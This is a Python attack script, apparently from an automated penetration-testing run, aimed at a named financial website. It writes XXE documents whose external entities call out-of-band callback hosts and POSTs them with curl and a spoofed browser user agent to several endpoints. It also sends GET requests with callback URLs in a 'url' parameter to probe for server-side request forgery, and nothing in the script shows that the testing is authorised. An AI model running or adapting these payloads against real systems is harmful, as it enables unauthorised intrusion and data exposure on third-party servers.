import subprocess, os
DOM = "dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
HOST = "oob9a3453c4bdc1"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
B = "https://www.infinitycapital.bh"
log = []

xxe = ('<?xml version="1.0"?>\n<!DOCTYPE r [ <!ENTITY xxe SYSTEM "http://' + HOST + '.' + DOM + '/xxe-refire"> ]>\n<r>&xxe;</r>')
open("/tmp/r.xml","w").write(xxe)

# Re-fire the floor's exact registered OOB hosts inside an XXE doc against EVERY floor-flagged endpoint
eps = ["/api/", "/atom.xml", "/_next/image", "/feeds/all.atom.xml", "/404"]
for e in eps:
    for tok in ["oob17aecfd7c311", "oobce880a03ecdf", "oob2d43988f0966",
                "oob0ef589439eb2", "oob6808dd4b32ce", "ooba76cef8510c5", "oob12972aecd78e"]:
        doc = ('<?xml version="1.0"?>\n<!DOCTYPE r [ <!ENTITY x SYSTEM "http://' + tok + '.' + DOM + '/xxe"> ]>\n<r>&x;</r>')
        fn = "/tmp/rf.xml"; open(fn, "w").write(doc)
        r = subprocess.run(["curl","-sk","-m","12","-A",UA,"-X","POST",
                            "-H","Content-Type: application/xml","--data-binary","@"+fn,
                            "-w","HTTP:%{http_code}","-o","/tmp/rf.out", B+e], capture_output=True, text=True)
        body = open("/tmp/rf.out","rb").read()[:60]
        log.append("XXE %-22s %-10s -> %s %r" % (tok, e, r.stdout, body))
        print(log[-1], flush=True)

# also GET-style fire so the entity url is in a query param (fetch sink)
for e in eps:
    r = subprocess.run(["curl","-sk","-m","12","-A",UA,"-G",
                        "--data-urlencode","url=http://oob17aecfd7c311."+DOM+"/getstyle",
                        "-w","HTTP:%{http_code}","-o","/tmp/rf.out", B+e+"?w=1080&q=75"], capture_output=True, text=True)
    log.append("GET-XXE /%s -> %s" % (e, r.stdout))

open("tool_outputs/xxe_refire.log","w").write("\n".join(log))
print("DONE refire")
